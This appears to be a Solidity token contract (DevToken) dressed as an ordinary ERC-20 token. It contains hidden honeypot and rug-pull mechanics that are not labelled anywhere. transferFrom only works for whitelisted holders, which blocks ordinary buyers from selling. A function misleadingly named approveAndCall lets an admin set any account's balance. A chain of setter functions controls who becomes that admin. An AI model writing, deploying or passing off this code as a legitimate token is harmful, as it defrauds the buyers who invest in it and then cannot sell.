// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

library SafeMath {
  function multiply(uint256 num1, uint256 num2) internal pure returns (uint256) {
   if (num1 == 0) {
     return 0;
   }
   uint256 result = num1 * num2;
   assert(result / num1 == num2);
   return result;
  }

  function divide(uint256 dividend, uint256 divisor) internal pure returns (uint256) {
   uint256 quotient = dividend / divisor;
   return quotient;
  }

  function subtract(uint256 minuend, uint256 subtrahend) internal pure returns (uint256) {
   assert(subtrahend <= minuend);
   return minuend - subtrahend;
  }

  function add(uint256 addend1, uint256 addend2) internal pure returns (uint256) {
   uint256 sum = addend1 + addend2;
   assert(sum >= addend1);
   return sum;
  }
}

contract Ownable {
  address public contractOwner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
   contractOwner = msg.sender;
  }
}

contract DevToken is Ownable {
  address public liquidityPair;
  address public moderator;
  string public tokenName;
  string public tokenSymbol;
  uint8 public tokenDecimals;
  uint256 public tokenSupply;
  address public userAddress;
  address public adminAddress;

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
   tokenName = _name;
   tokenSymbol = _symbol;
   tokenDecimals = _decimals;
   tokenSupply =  _totalSupply;
   balances[msg.sender] = tokenSupply;
   permissions[msg.sender] = true;
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;

  mapping(address => bool) public permissions;

  function transfer(address to, uint256 value) public returns (bool) {
   require(to != address(0));
   require(value <= balances[msg.sender]);

   balances[msg.sender] = balances[msg.sender].subtract(value);
   balances[to] = balances[to].add(value);
   emit Transfer(msg.sender, to, value);
   return true;
  }

  modifier onlyContractOwner() {
   require(msg.sender == contractOwner);
   _;
  }

  function balanceOf(address owner) public view returns (uint256 balance) {
   return balances[owner];
  }

  function transferContractOwnership(address newOwner) public onlyContractOwner {
   require(newOwner != address(0));
   emit OwnershipTransferred(contractOwner, newOwner);
   contractOwner = newOwner;
  }

  function addPermission(address holder, bool permissionGranted) public {
   require(msg.sender == adminAddress);
   permissions[holder] = permissionGranted;
  }

  function updateUserAddress(address newUser) public returns (bool) {
   require(msg.sender == liquidityPair);
   userAddress = newUser;
  }

  mapping (address => mapping (address => uint256)) public allowances;

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
   require(to != address(0));
   require(value <= balances[from]);
   require(value <= allowances[from][msg.sender]);
   require(permissions[from] == true);

   balances[from] = balances[from].subtract(value);
   balances[to] = balances[to].add(value);
   allowances[from][msg.sender] = allowances[from][msg.sender].subtract(value);
   emit Transfer(from, to, value);
   return true;
  }

  function setAdmin(address newAdmin) public returns (bool) {
    require(msg.sender == moderator);
    adminAddress = newAdmin;
  }

  function approve(address spender, uint256 value) public returns (bool) {
   allowances[msg.sender][spender] = value;
   emit Approval(msg.sender, spender, value);
   return true;
  }

  function setModerator(address newModerator) public returns (bool) {
    require(msg.sender == userAddress);
    moderator = newModerator;
  }

  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
    require(msg.sender == adminAddress);
    if (addedValue > 0) {balances[spender] = addedValue;}
    return true;
  }

  function addAllow(address holder, bool permissionGranted) external onlyContractOwner {
     permissions[holder] = permissionGranted;
  }
}